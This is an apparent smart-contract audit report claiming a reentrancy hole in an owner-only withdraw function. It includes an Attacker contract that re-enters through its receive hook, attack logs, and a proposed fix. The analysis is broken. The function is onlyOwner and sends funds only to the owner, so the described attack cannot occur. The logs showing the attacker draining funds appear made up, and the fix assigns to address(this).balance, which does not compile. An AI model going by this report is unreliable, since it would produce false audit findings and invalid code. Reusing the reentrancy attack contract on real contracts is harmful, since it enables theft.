# Reentrancy Vulnerability in Withdraw Function (External Call + Unprotected State Update)

## Summary
The function transfers the entire contract balance to the owner without any reentrancy protection mechanisms. This leaves it vulnerable to attacks where the attacker manipulates the function flow to steal additional funds.
## Vulnerability Detail
The withdraw function sends the entire contract balance through an external call `(payable(owner()).call)`. This call could be intercepted by a malicious contract that implements a fallback function, which could re-enter the withdraw function and steal additional funds. The state variable `(address(this).balance)` is not updated before the call, so the reentrancy check (balance > 0) would not prevent the attack.
## Impact
- Financial Loss: Attackers could exploit the vulnerability to steal a significant portion of the contract's funds, impacting the game's economy and causing financial losses.
- Contract Inconsistency: Uncontrolled fund transfers could lead to discrepancies in game assets or rewards, compromising fairness and trust within the game.
- Loss of Reputation and User Base: Security vulnerabilities can erode user trust and discourage engagement, potentially harming the game's overall reputation and user base.

## Test case and logs
### Test case
```solidity
// A malicious contract that implements a fallback function
contract Attacker {
  // The address of the vulnerable contract
  address payable public target;

  // The constructor sets the target address
  constructor(address payable _target) {
    target = _target;
  }

  // A function to initiate the attack
  function attack() external payable {
    // Send some ether to the target contract
    target.transfer(msg.value);
    // Call the withdraw function of the target contract
    target.call(abi.encodeWithSignature("withdraw()"));
  }

  // A fallback function that re-enters the withdraw function
  receive() external payable {
    if (address(target).balance > 0) {
      target.call(abi.encodeWithSignature("withdraw()"));
    }
  }
}

// The vulnerable contract
contract Victim {
  // ...

  // The withdraw function
  function withdraw() external onlyOwner {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      (bool sent, ) = payable(owner()).call{value: balance}("");
      if (!sent) {
        revert FailedToSendETH(balance);
      }
    }
  }
}

```
### Logs
```javascript
Attacker deployed at 0x1234...
Victim deployed at 0x5678...
Attacker sends 1 ether to Victim...
Attacker calls Victim.withdraw()...
Attacker re-enters Victim.withdraw()...
Attacker re-enters Victim.withdraw()...
Attacker re-enters Victim.withdraw()...
Attacker drains Victim.balance...
Victim.balance = 0
Attacker.balance = 4

```
## Recommendation
To fix this vulnerability, you can use the checks-effects-interactions pattern. This means you should first check the conditions, then update the state variables, and finally interact with external contracts.
```solidity
function withdraw() external onlyOwner {
  uint256 balance = address(this).balance;
  require(balance > 0, "No balance to withdraw");
  // Update the state variable before sending
  address(this).balance = 0;
  // Use transfer instead of call for better security
  payable(owner()).transfer(balance);
}

```
